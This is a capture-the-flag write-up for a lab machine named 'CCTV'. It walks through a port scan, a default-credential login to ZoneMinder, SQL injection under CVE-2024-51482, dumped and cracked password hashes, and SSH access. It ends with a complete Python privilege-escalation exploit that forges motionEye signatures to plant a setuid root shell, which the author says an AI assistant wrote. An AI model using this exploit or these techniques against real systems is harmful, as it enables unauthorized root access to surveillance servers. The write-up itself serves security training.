CCTV is an easy linux machine

# Enumeration

The nmap command I used is:
```
sudo nmap -sC -sV -vv -oA CCTV [Machine IP]
```

Here is the output:
```
# Nmap 7.98 scan initiated Sun Mar  8 00:31:20 2026 as: /usr/lib/nmap/nmap -sC -sV -vv -oA cctv 10.129.1.158
Nmap scan report for 10.129.1.158
Host is up, received reset ttl 63 (0.47s latency).
Scanned at 2026-03-08 00:31:21 EST for 80s
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 9.6p1 Ubuntu 3ubuntu13.14 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 76:1d:73:98:fa:05:f7:0b:04:c2:3b:c4:7d:e6:db:4a (ECDSA)
|_ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBDZ15GCLPzC4gTM0nqzpUbr/2L77bM1C9sbBecivQPX/KcKvJrP88peCJXwTug7T/EORHr7M7JeHtMQJ6hYihFA=
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.58
|_http-title: Did not follow redirect to http://cctv.htb/
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
Service Info: Host: default; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Mar  8 00:32:41 2026 -- 1 IP address (1 host up) scanned in 81.12 seconds
```

We have 2 ports open
22, which is SSH, and the banner tells us that it's an Ubuntu server
80, which is HTTP, and the banner tells us it's running Apache 2.4.58

`http://cctv.htb`:
![[Pasted image 20260309232039.png]]

On opening staff login, it takes us to `http://cctv.htb/zm`, its running `zoneminder`

`_ZoneMinder_ is a free, open source Closed-circuit television software application developed for Linux which supports IP, USB and Analog cameras.`
Here is what it's github page says

I tried default credentials `admin:admin`, and it logged me as a user `admin`

`http://cctv.htb/zm/?view=options&tab=API`:
![[{104477EA-FC40-484E-AE30-02F8B1D10674}.png]]

There are 3 users
`admin`, `mark` and `superadmin`

The web page is running zoneminder version `1.37.63`, which is vulnerable to `CVE-2024-51482`
https://github.com/ZoneMinder/zoneminder/security/advisories/GHSA-qm8h-3xvf-m7j3

Zoneminder is vulnerable to SQL Injection at 
```
http://cctv.htb/zm/index.php?view=request&request=event&action=removetag&tid=1
```

Using `SQLMAP`, I got these credentials:
```
+------------+--------------------------------------------------------------+
| Username   | Password                                                     |
+------------+--------------------------------------------------------------+
| superadmin | $2y$10$cmytVWFRnt1XfqsItsJRVe/ApxWxcIFQcURnm5N.rhlULwM0jrtbm |
| mark       | $2y$10$prZGnazejKcuTv5bKNexXOgLyQaok0hq07LW7AJ/QNqZolbXKfFG. |
| admin      | $2y$10$t5z8uIT.n9uCdHCNidcLf.39T1Ui9nrlCkdXrzJMnJgkTiAvRUM6m |
+------------+--------------------------------------------------------------+
```

Upon cracking hash for `mark`, the password was `opensesame`
I SSHed as mark, and after enumeration through the system, I found that in `/var/lib`, there are 2 folders named `motion` and `motioneye`
`motionEye is _an online interface for the software motion_, a video surveillance program with motion detection.`

Port 7999 and 8765 were being used by Motion and MotionEye respectively

I used Claude to make an exploit for this:
```
import hashlib,requests,json,time,urllib.parse,re

motioneye="http://127.0.0.1:8765"
motion="http://127.0.0.1:7999"
admin_hash="989c5a8ee87a0e9521ec81a79187d162109282f0"

sig_re=re.compile(r'[^a-zA-Z0-9/?_.=&{}\[\]":, -]')

def sig(method,uri,body,key):
    parts=list(urllib.parse.urlsplit(uri))
    q=[x for x in urllib.parse.parse_qsl(parts[3],keep_blank_values=True) if x[0]!="_signature"]
    q.sort(key=lambda x:x[0])
    q="&".join([f"{n}={urllib.parse.quote(v,safe='!()*~')}" for n,v in q])
    parts[0]=parts[1]=""
    parts[3]=q
    path=urllib.parse.urlunsplit(parts)
    path=sig_re.sub("-",path)
    key=sig_re.sub("-",key)
    body=body and sig_re.sub("-",body)
    msg=f"{method}:{path}:{body or ''}:{key}"
    return hashlib.sha1(msg.encode()).hexdigest()

def req(method,path,body=None):
    uri=path+("&" if "?" in path else "?")+"_username=admin&_admin=true"
    s=sig(method,uri+"&_signature=x",body or "",admin_hash)
    url=motioneye+uri+"&_signature="+s
    r=requests.request(method,url,data=body,headers={"Content-Type":"application/json"} if body else {})
    return r.text

print("[*] Getting config")
cfg=json.loads(req("GET","/config/1/get"))

cfg["command_notifications_enabled"]=True
cfg["command_notifications_exec"]="cp /bin/bash /tmp/rootbash; chmod u+s /tmp/rootbash"
cfg["framerate"]=3

print("[*] Updating config")
req("POST","/config/1/set",json.dumps(cfg))

print("[*] Waiting for restart")
time.sleep(10)

print("[*] Triggering motion")
requests.get(f"{motion}/1/config/set?emulate_motion=on")

print("[+] Check:")
print("ls -l /tmp/rootbash")
print("/tmp/rootbash -p")
```

Used this to get root and user flag at the same time.



